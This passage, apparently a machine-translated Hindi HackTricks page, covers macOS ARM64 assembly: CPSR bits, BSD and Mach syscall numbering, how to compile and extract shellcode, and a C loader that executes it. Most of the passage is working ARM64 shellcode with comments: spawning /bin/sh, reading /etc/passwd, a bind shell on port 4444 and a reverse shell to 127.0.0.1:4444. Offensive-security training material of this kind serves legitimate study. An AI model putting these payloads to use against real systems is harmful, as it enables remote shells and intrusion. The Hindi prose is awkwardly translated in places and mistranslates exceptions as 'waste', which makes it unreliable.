* **`J`** और **`T`** बिट: **`J`** 0 होना चाहिए और यदि **`T`** 0 है तो इस्तेमाल किया जाता है A32 निर्देश सेट, और यदि यह 1 है, तो T32 का उपयोग किया जाता है।
* **IT ब्लॉक स्थिति रजिस्टर** (`ITSTATE`): ये 10-15 और 25-26 से बिट हैं। ये एक **`IT`** प्रिफिक्स ग्रुप के भीतर निर्देशों के लिए स्थितियाँ संग्रहीत करते हैं।
* **`E`** बिट: **एंडियनेस** को दर्शाता है।
* **मोड और अपशिष्ट मास्क बिट** (0-4): वर्तमान क्रियान्वयन स्थिति निर्धारित करते हैं। **5वां** बिट यह दर्शाता है कि कार्यक्रम 32-बिट (1) या 64-बिट (0) के रूप में चल रहा है। अन्य 4 वर्तमान में उपयोग में होने वाले **अपशिष्ट मोड** को दर्शाते हैं (जब एक अपशिष्ट होता है और इसे संभाला जा रहा है)। संख्या सेट **वर्तमान प्राथमिकता** को दर्शाती है यदि इसे संभालते समय एक और अपशिष्ट ट्रिगर होता है।

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: कुछ अपशिष्ट को बंद किया जा सकता है उपयोग करके बिट **`A`**, `I`, `F`. यदि **`A`** 1 है तो इसका मतलब है कि **असमक्रिय अबॉर्ट्स** ट्रिगर होंगे। **`I`** बाह्य हार्डवेयर **इंटरप्ट रिक्वेस्ट्स** (IRQs) का प्रतिक्रिया देने के लिए कॉन्फ़िगर करता है। और F **फास्ट इंटरप्ट रिक्वेस्ट्स** (FIRs) से संबंधित है।

## macOS

### BSD सिसकॉल्स

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) की जाँच करें। BSD सिसकॉल्स में **x16 > 0** होगा।

### Mach ट्रैप्स

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) की जाँच करें। Mach ट्रैप्स में **x16 < 0** होगा, इसलिए आपको पिछली सूची से नंबर को एक **माइनस** के साथ कॉल करने की आवश्यकता है: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`** है।

आप इन्हें कैसे कॉल करने के लिए (और BSD) सिसकॉल्स को खोजने के लिए एक disassembler में **`libsystem_kernel.dylib`** भी जांच सकते हैं:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डिकंपाइल** कोड की जाँच करना स्रोत कोड की जाँच से आसान होता है क्योंकि कई सिसकॉल्स (बीएसडी और मैक) का कोड स्क्रिप्ट्स के माध्यम से उत्पन्न किया जाता है (स्रोत कोड में टिप्पणियों की जाँच करें) जबकि dylib में आप देख सकते हैं कि क्या कॉल किया जा रहा है।
{% endhint %}

### शैलकोड

कॉम्पाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स को निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>शैलकोड का परीक्षण करने के लिए सी कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### शैल

[**यहाँ से**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) लिया गया है और समझाया गया है।

{% tabs %}
{% tab title="adr के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% टैब शीर्षक = "स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### कैट के साथ पढ़ें

उद्देश्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना, इसलिए दूसरा तर्क (x1) पैरामीटरों का एक एरे है (जिसका मतलब है कि मेमोरी में ये पतों का एक स्टैक है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### एक फोर्क से एसएच के साथ कमांड को आमंत्रित करें ताकि मुख्य प्रक्रिया को मार नहीं दिया जाए
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शैल

बाइंड शैल [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) में **पोर्ट 4444** से।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शैल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से, **127.0.0.1:4444** के लिए रिवशैल।
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
